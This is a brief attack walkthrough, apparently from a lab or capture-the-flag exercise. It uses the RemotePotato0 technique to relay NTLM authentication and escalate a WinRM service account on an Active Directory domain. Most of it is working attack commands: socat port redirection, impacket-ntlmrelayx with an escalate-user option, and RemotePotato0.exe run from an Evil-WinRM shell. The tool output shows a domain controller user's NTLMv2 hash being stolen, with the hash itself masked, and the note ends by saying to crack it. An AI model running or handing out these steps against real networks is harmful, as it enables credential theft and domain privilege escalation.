# RemotePotato 


See: https://github.com/antonioCoco/RemotePotato0


Remote AD: 10.129.92.155
Local: 10.10.16.14

Attacker Run:
``` bash
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:10.129.92.155:9999
sudo impacket-ntlmrelayx -t ldap://10.10.16.14 --no-wcf-server --escalate-user winrm_svc
```

Domain Run:
``` cmd
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RemotePotato0.exe  -m 2 -s 1 -x 10.10.16.14 -p 9999
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : xxxxxxxxxxxxxxx
NTLMv2 Hash     : xxxxxxxxxxxxxxxx

```

And Crack the hash.